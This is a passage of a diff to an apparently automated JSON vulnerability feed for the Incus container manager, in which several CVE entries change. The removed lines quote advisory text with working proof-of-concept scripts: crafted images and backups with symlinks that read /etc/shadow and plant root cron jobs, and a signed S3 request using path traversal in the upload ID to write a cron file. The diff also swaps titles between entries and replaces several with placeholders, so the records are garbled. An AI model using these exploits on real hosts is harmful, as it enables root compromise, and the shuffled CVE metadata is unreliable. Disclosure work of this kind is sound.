container\n  content_type: filesystem\n  config: {}\npool:\n  name: default\n  driver: dir\n  config: {}\n__EOF__\n\ncat<<__EOF__>\"${tmpdir}/img/backup/container/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: afrw-backup-templates-symlink\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/backup/container/templates\"\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar\nincus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink\n\nincus config template ls afrw-backup-templates-symlink\n\n# read\n#incus config template show afrw-backup-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-backup-templates-symlink poc-32\n#incus config template edit afrw-templates-symlink poc\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1273,8 +1273,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1286,8 +1286,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
-                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1312,8 +1312,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1675,8 +1675,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1701,8 +1701,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1714,8 +1714,8 @@
             },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nFor container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.\n\nFor instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.\n\nIn practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.\n\n\n### PoC\n\n#### Malicious container image\n\nBelow, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/templates\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC templates symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar\nincus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink\nincus init afrw-image-templates-symlink afrw-image-templates-symlink\n\nincus config template ls afrw-image-templates-symlink\n\n# read\n#incus config template show afrw-image-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-image-templates-symlink poc-32\n#incus config template edit afrw-image-templates-symlink poc\n```\n\n#### Malicious instance backup\n\n\nBelow, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/backup\"\ncat<<__EOF__>\"${tmpdir}/img/backup/index.yaml\"\nname: afrw-backup-templates-symlink\nbackend: dir\npool: default\ntype: container\noptimized: false\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container\"\ncat<<__EOF__>\"${tmpdir}/img/backup/container/backup.yaml\"\ncontainer:\n  name: afrw-backup-templates-symlink\n  architecture: x86_64\n  type: container\n  status: Stopped\n  status_code: 102\n  stateful: false\n  ephemeral: false\n  profiles:\n    - default\n  config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  expanded_config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  devices: {}\n  expanded_devices:\n    root:\n      path: /\n      pool: default\n      type: disk\n  created_at: \"2024-01-01T00:00:00Z\"\n  last_used_at: \"2024-01-01T00:00:00Z\"\nvolume:\n  name: afrw-backup-templates-symlink\n  type: container\n  content_type: filesystem\n  config: {}\npool:\n  name: default\n  driver: dir\n  config: {}\n__EOF__\n\ncat<<__EOF__>\"${tmpdir}/img/backup/container/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: afrw-backup-templates-symlink\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/backup/container/templates\"\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar\nincus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink\n\nincus config template ls afrw-backup-templates-symlink\n\n# read\n#incus config template show afrw-backup-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-backup-templates-symlink poc-32\n#incus config template edit afrw-templates-symlink poc\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1727,8 +1727,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1740,8 +1740,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
-                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1766,8 +1766,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
